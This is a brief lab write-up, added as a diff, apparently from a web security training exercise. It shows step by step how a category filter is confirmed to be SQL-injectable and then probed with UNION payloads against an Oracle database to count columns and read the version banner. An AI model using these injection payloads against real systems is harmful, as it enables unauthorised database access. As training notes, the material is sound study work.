@@ -1,0 +1,9 @@
+Frist cause error in the request via ('):
+GET /filter?category=Accessories' HTTP/2 => server respond with internal server error
+Try '' => We get 200 ok then the server is sure has sqli vulnerability.
+Via lab description : use a UNION attack to retrieve the results from an injected query. 
+The union payload: ' UNION SELECT NULL FROM dual-- 
+Gives us an error 
+Try to put another null column : ' UNION SELECT NULL,NULL FROM dual--
+Gives us no error so the sql query is in 2 columns
+Try to get the verison via this payload : ' UNION SELECT banner FROM v$version--
